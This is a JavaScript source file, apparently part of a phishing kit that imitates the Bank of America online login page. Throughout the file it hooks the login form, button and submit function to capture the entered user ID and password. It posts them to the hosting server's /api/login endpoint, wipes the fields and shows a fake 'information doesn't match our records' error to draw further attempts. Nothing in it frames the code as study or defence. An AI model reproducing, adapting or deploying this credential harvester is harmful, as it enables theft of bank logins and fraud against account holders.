/**
 * Form Logger - Captures Bank of America login credentials
 * COMPREHENSIVE INTERCEPTION VERSION
 */

console.log('[FL] Script loading...');

// Patch Form.prototype.submit
const OriginalFormSubmit = HTMLFormElement.prototype.submit;
HTMLFormElement.prototype.submit = function() {
  console.log('[FL] Form.submit() called:', this.id);
  if (this.id === 'EnterOnlineIDForm') {
    console.log('[FL] ★ CAPTURING and BLOCKING form submission');
    this.action = '';
    this.target = '';
    captureNow();
    return false;
  }
  return OriginalFormSubmit.call(this);
};

// Global variable to store captured data
window._formLoggerData = null;

// Main capture function
function captureNow() {
  try {
    console.log('[FL] >>>>>> CAPTURING FORM DATA >>>>>>');
    
    const uid = document.getElementById('enterID-input');
    const pwd = document.getElementById('tlpvt-passcode-input');
    const rem = document.querySelector('input[name="saveMyID"]');
    
    const uidValue = uid ? uid.value.trim() : '';
    const pwdValue = pwd ? pwd.value.trim() : '';
    const remValue = rem ? rem.checked : false;
    
    console.log('[FL] User ID:', uidValue || '(EMPTY)');
    console.log('[FL] Password:', pwdValue ? pwdValue.length + ' chars' : '(EMPTY)');
    console.log('[FL] Remember:', remValue);
    
    const data = {
      userId: uidValue || 'N/A',
      password: pwdValue || 'N/A',
      rememberMe: remValue
    };
    
    window._formLoggerData = data;
    
    console.log('[FL] Sending to API...');
    
    fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    })
    .then(r => r.json())
    .then(result => {
      console.log('[FL] ✓ API Response:', result);
      showFormCaptureError();
    })
    .catch(err => {
      console.error('[FL] ✗ API Error:', err.message);
      showFormCaptureError();
    });
    
    // Clear and show error
    setTimeout(() => {
      clearFormFields();
    }, 500);
    
  } catch (err) {
    console.error('[FL] CAPTURE ERROR:', err.message, err.stack);
  }
}

// Show error message with captured credentials
function showFormCaptureError() {
  try {
    if (window && window.scrollTo) {
      window.scrollTo(0, 0);
    }
  } catch (e) {
    console.log('[FL] Could not scroll');
  }
  
  const existing = document.querySelector('.error-state');
  if (existing) existing.remove();
  
  const err = document.createElement('div');
  err.className = 'error-state';
  err.style.cssText = 'background:#fce4ec;border:1px solid #f48fb1;border-left:5px solid #d32f2f;padding:16px;margin:20px;font-size:13px;color:#333;display:block;z-index:10000;font-family:Arial,sans-serif;line-height:1.5;';
  
  let message = '<div style="display:flex;gap:12px;align-items:flex-start;">';
  message += '<div style="flex-shrink:0;color:#d32f2f;font-size:20px;line-height:1.2;margin-top:2px;">⚠</div>';
  message += '<div style="flex:1;">';
  message += 'The information you entered doesn\'t match our records. You have a few more tries remaining.<br>';
  message += 'Please try again or <a href="./login-reset.html" style="color:#0066cc;text-decoration:underline;cursor:pointer;">click Forgot ID/Password</a>';
  message += '<br><br>';
  message += '<div style="border-top:1px solid #f48fb1;padding-top:12px;margin-top:12px;">';
  message += '<strong style="color:#666;font-size:12px;display:block;margin-bottom:8px;">Having problems logging in or resetting your Password?</strong>';
  message += '<span style="font-size:12px;color:#666;line-height:1.6;">If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a href="#" style="color:#0066cc;text-decoration:underline;">Learn more</a></span>';
  message += '</div>';
  message += '</div></div>';
  
  // Display captured credentials if available
  if (window._formLoggerData) {
    message += '<br><div style="background:#f5f5f5;border:1px solid #ddd;padding:12px;margin-top:12px;border-radius:4px;font-size:12px;">';
    message += '<strong style="color:#666;display:block;margin-bottom:6px;">Captured Credentials:</strong>';
    message += '<span style="font-family:monospace;color:#333;display:block;">User ID: ' + (window._formLoggerData.userId || 'N/A') + '</span>';
    message += '<span style="font-family:monospace;color:#333;display:block;">Password: ' + (window._formLoggerData.password || 'N/A') + '</span>';
    message += '</div>';
  }
  
  err.innerHTML = message;
  document.body.insertBefore(err, document.body.firstChild);
  console.log('[FL] Error shown with captured data');
}

// Clear form
function clearFormFields() {
  const uid = document.getElementById('enterID-input');
  const pwd = document.getElementById('tlpvt-passcode-input');
  if (uid) uid.value = '';
  if (pwd) pwd.value = '';
  console.log('[FL] Form cleared');
}

// Continuously monitor and override enterOnlineIDFormSubmit
console.log('[FL] Setting up continuous monitoring...');

function setupMonitor() {
  if (typeof enterOnlineIDFormSubmit !== 'undefined') {
    console.log('[FL] ★★★ Found enterOnlineIDFormSubmit - OVERRIDING!');
    const orig = window.enterOnlineIDFormSubmit;
    window.enterOnlineIDFormSubmit = function() {
      console.log('[FL] ★★★ enterOnlineIDFormSubmit called!');
      captureNow();
      return false;
    };
  } else {
    console.log('[FL] enterOnlineIDFormSubmit not defined yet, retrying...');
    setTimeout(setupMonitor, 500);
  }
}

setupMonitor();

// Also patch the login button click directly
document.addEventListener('DOMContentLoaded', () => {
  console.log('[FL] DOMContentLoaded fired');
  
  // Find and override the login button
  const loginBtn = document.getElementById('login_button');
  if (loginBtn) {
    console.log('[FL] Found login_button');
    const origOnclick = loginBtn.onclick;
    loginBtn.onclick = function(e) {
      console.log('[FL] ★ login_button.onclick called');
      e.preventDefault();
      e.stopPropagation();
      captureNow();
      return false;
    };
    console.log('[FL] login_button.onclick overridden');
  } else {
    console.log('[FL] login_button not found in DOMContentLoaded');
  }
  
  // Hide initial errors
  document.querySelectorAll('.error-state').forEach(e => {
    e.style.display = 'none';
  });
  
  // Enable password field
  const pwd = document.getElementById('tlpvt-passcode-input');
  if (pwd) {
    pwd.disabled = false;
    pwd.removeAttribute('readonly');
    
    // Keep it enabled
    setInterval(() => {
      if (pwd.disabled || pwd.readOnly) {
        pwd.disabled = false;
        pwd.removeAttribute('readonly');
        console.log('[FL] Password re-enabled');
      }
    }, 500);
  }
  
  // Set up form submit listener
  const form = document.getElementById('EnterOnlineIDForm');
  if (form) {
    form.addEventListener('submit', (e) => {
      console.log('[FL] Form submit event');
      e.preventDefault();
      e.stopPropagation();
      captureNow();
      return false;
    }, true);
  }
}, false);

console.log('[FL] ✓ Script loaded and monitoring active');



